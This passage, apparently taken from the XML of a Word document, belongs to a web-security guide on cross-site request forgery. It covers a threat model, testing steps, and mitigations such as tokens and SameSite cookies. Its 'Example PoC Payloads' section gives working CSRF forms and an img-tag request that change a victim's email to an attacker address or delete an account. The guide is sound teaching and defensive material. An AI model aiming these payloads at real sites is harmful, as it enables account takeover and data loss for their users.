      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> headers, and client certificates, the attacker can exploit this trust to perform state-changing actions (such as money transfers, email changes, or password resets).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3657D717" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="133" w:name="_Toc208408604"/>
      <w:r>
        <w:t>Threat Model</w:t>
      </w:r>
      <w:bookmarkEnd w:id="133"/>
    </w:p>
    <w:p w14:paraId="62E3702F" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Attacker goal: Trigger state-changing actions on behalf of the victim.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Victim condition: Must be authenticated on the target site (active session cookies).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Attack path:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Victim logs in to https://victim.example.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Attacker lures victim to https://attacker.example.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Victim’s browser automatically includes cookies/headers, and the request to victim site is processed as if it came from them.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Impact: Fund transfers, email/phone number changes, password resets, privilege escalation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A53AB51" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="134" w:name="_Toc208408605"/>
      <w:r>
        <w:t>Testing for CSRF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="134"/>
    </w:p>
    <w:p w14:paraId="06E02004" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1. Identify Targets: Look for state-changing endpoints (password change, email update, fund transfer, delete actions). Check if they accept GET or POST requests without confirmation.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2. Inspect Requests: Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>BurpSuite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/ZAP to capture a valid request and check if:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- The request relies only on cookies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- A CSRF token parameter is present</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Origin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> header is validated</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">3. Build Proof-of-Concepts: If no </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>defenses</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> are found, create harmless test payloads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F38E7E8" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="135" w:name="_Toc208408606"/>
      <w:r>
        <w:t xml:space="preserve">Example </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>PoC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> Payloads</w:t>
      </w:r>
      <w:bookmarkEnd w:id="135"/>
    </w:p>
    <w:p w14:paraId="2525A0CD" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Classic Auto-Submit Form:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;form action="https://</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>victim.example</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/account/email" method="POST"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.forms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[0].submit();&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Multipart Form Bypass:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;form action="https://</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>victim.example</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">/profile" method="POST" </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>enctype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>="multipart/form-data"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>  &lt;input type="text" name="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>display_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>" value="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pwned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.forms</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[0].submit();&lt;/script&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>GET Request Exploit:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>="https://</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>victim.example</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/account/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>delete?id</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=123"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F969311" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B" w:rsidP="00491EB0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:bookmarkStart w:id="136" w:name="_Toc208408607"/>
      <w:r>
        <w:t>Defensive Mitigations</w:t>
      </w:r>
      <w:bookmarkEnd w:id="136"/>
    </w:p>
    <w:p w14:paraId="3E94CEAA" w14:textId="77777777" w:rsidR="00A6171B" w:rsidRDefault="00A6171B">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="200" w:afterAutospacing="0"/>
        <w:divId w:val="1001666305"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1. CSRF Tokens:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Synchronizer Token Pattern: server issues a random per-session/per-request token in forms/headers.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Double-Submit Cookie: token stored in both cookie and hidden field; server checks match.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>Tokens must be unpredictable and ideally per-request.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">2. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cookies:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">=Strict or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=Lax prevents most CSRF by not sending cookies cross-site.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SameSite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=None must be paired with Secure.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">3. Origin and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Header Validation:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Check Origin header for POST requests.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Fallback</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> if Origin is missing.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>4. Enforce JSON APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br/>
        <w:t>- Accept only JSON requests with custom headers (Content-Type: application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:hAnsi="Cambria"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
